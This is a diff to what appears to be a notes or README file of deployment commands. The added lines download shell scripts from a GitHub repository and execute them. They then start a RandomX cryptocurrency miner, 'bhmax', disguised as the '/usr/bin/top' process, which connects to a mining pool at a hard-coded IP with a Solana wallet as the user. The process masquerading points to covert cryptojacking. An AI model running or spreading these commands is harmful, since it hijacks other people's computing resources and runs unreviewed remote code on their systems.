@@ -1,11 +1,23 @@
-##action one
+##action one 
+
+#deep
 
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/rest.sh && chmod +x rest.sh && ./rest.sh && cd /usr/bin
+
+#datalr
+
+wget https://raw.githubusercontent.com/hudahadoh/hime/main/dl.sh && chmod +x dl.sh && ./dl.sh && cd /usr/bin
 
 ##rand optimized deep
 example : 
 
 ./hi -s "/usr/bin/top" -d -p test.pid ./bhmax --url 158.69.251.105:4052 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.xhif --pass x -k -t 8 --randomx-no-numa --randomx-mode auto 	--randomx-wrmsr=-1 	--randomx-no-rdmsr --cpu-memory-pool=-1 --no-huge-pages
+
+##rand optimized datalr
+example : 
+
+./hi -s "/usr/bin/top" -d -p test.pid ./bhmax --url 158.69.251.105:4052 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.xhif --pass x -k -t 2 --randomx-no-numa --randomx-mode auto 	--randomx-wrmsr=-1 	--randomx-no-rdmsr --cpu-memory-pool=-1 --no-huge-pages
+
 
 ###rand optimized colb
 
